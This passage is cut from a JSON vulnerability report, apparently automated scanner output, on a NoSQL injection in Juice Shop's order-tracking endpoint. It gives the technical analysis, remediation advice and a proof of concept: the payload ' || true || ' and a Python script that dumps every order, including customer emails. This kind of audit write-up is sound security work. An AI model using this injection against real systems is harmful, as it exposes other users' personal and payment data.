          "properties": {
            "security-severity": "7.5",
            "strix": {
              "id": "vuln-0006",
              "severity": "high",
              "cvss": 7.5,
              "timestamp": "2026-05-09 09:46:47 UTC",
              "target": "https://github.com/juice-shop/juice-shop",
              "endpoint": "/rest/track-order/:id",
              "method": "GET",
              "cwe": "CWE-94",
              "impact": "Successful exploitation enables an attacker to:\n\n- Bypass intended query constraints and retrieve all order records from the database, including orders belonging to other users\n- Extract sensitive order data such as customer emails, order totals, product details, delivery addresses, and payment information\n- Execute arbitrary JavaScript expressions within the MongoDB `$where` evaluation context\n- Potentially cause denial of service through computationally expensive JavaScript expressions (e.g., infinite loops)\n- Enumerate the database structure through boolean-based or timing-based blind injection techniques\n\nThis constitutes a significant data breach vector as order data contains personally identifiable information and transactional details for all application users.",
              "technical_analysis": "The vulnerability resides in `routes/trackOrder.ts` at line 18. The order tracking function accepts a route parameter `:id` and embeds it directly into a MongoDB `$where` clause via JavaScript template literal interpolation:\n\n```typescript\ndb.ordersCollection.find({ $where: `this.orderId === '${id}'` })\n```\n\nThe `$where` operator in MongoDB evaluates the provided string as a JavaScript expression for each document in the collection. When the `id` value contains a single quote followed by JavaScript operators, the attacker breaks out of the intended string comparison.\n\nInput flow:\n1. User supplies `:id` route parameter (e.g., `' || true || '`)\n2. When challenge mode is active, only length truncation is applied (60 chars)\n3. The value is interpolated into: `this.orderId === '' || true || ''`\n4. MongoDB evaluates this expression — `true` causes the condition to match every document\n5. All orders in the collection are returned to the attacker\n\nThe MarsDB library used here implements the same `$where` semantics as standard MongoDB, executing the JavaScript string against each document. No input validation, escaping, or parameterized query mechanism is applied to the `id` before query construction.",
              "remediation_steps": "1. Replace the `$where` clause with a standard MongoDB equality query that does not evaluate JavaScript:\n\n   ```typescript\n   db.ordersCollection.find({ orderId: id })\n   ```\n\n   This uses MongoDB's native query operators which treat the value as a literal string, eliminating injection risk.\n\n2. Apply strict input validation on the `id` parameter before any database interaction:\n   ```typescript\n   const id = String(req.params.id).replace(/[^\\w-]+/g, '')\n   ```\n\n3. If `$where` is required for complex queries elsewhere, never interpolate user input directly. Use parameterized approaches or pre-validated constants only.\n\n4. Consider disabling JavaScript evaluation in MongoDB entirely via the `--noscripting` flag or `security.javascriptEnabled: false` configuration option in production environments.",
              "poc": {
                "description": "To reproduce:\n\n1. Send a GET request to the order tracking endpoint with a NoSQL injection payload:\n   `GET /rest/track-order/' || true || '`\n\n2. The server constructs the query: `this.orderId === '' || true || ''`\n\n3. The JavaScript expression evaluates to `true` for every document because of the `|| true` clause.\n\n4. All order documents in the collection are returned in the response instead of just the matching order.\n\n5. Verify the response contains multiple order objects with data belonging to different users (different email addresses, order IDs, etc.).",
                "script": "import requests\nfrom urllib.parse import quote\n\nBASE_URL = \"http://localhost:3000\"\nENDPOINT = \"/rest/track-order/\"\n\n# NoSQL injection payload to return all orders\n# Breaks out of string and injects always-true condition\npayload = \"' || true || '\"\nencoded_payload = quote(payload)\nurl = f\"{BASE_URL}{ENDPOINT}{encoded_payload}\"\n\nprint(f\"[*] Testing NoSQL Injection in order tracking\")\nprint(f\"[*] Payload: {payload}\")\nprint(f\"[*] Constructed $where: this.orderId === '{payload}'\")\nprint(f\"[*] Evaluates to: this.orderId === '' || true || ''\")\nprint(f\"[*] Request URL: {url}\")\nprint()\n\ntry:\n    resp = requests.get(url, timeout=10)\n    print(f\"[*] Response status: {resp.status_code}\")\n\n    data = resp.json()\n    if data.get(\"status\") == \"success\" and isinstance(data.get(\"data\"), list):\n        order_count = len(data[\"data\"])\n        print(f\"[*] Orders returned: {order_count}\")\n\n        if order_count > 1:\n            print(f\"[+] VULNERABLE: NoSQL injection returned {order_count} orders!\")\n            print(\"[+] The $where clause was manipulated to match all documents.\")\n            for i, order in enumerate(data[\"data\"][:5]):\n                print(f\"    Order {i+1}: ID={order.get('orderId', 'N/A')}, \"\n                      f\"Email={order.get('email', 'N/A')}, \"\n                      f\"Total={order.get('totalPrice', 'N/A')}\")\n        elif order_count == 1:\n            print(\"[*] Single order returned - DB may be empty or injection not triggered\")\n            print(f\"    Order: {data['data'][0]}\")\n        else:\n            print(\"[-] No orders returned\")\n    else:\n        print(f\"[-] Unexpected response: {resp.text[:300]}\")\n\nexcept requests.exceptions.ConnectionError:\n    print(\"[!] Could not connect to target. Verify the application is running.\")\n    print(\"[!] The vulnerability is confirmed via source code analysis:\")\n    print(\"[!] File: routes/trackOrder.ts, Line 18\")\n    print(\"[!] $where clause uses direct string interpolation of user input\")"
              }
            }
          }
        },
        {
          "ruleId": "CWE-611",
          "level": "error",
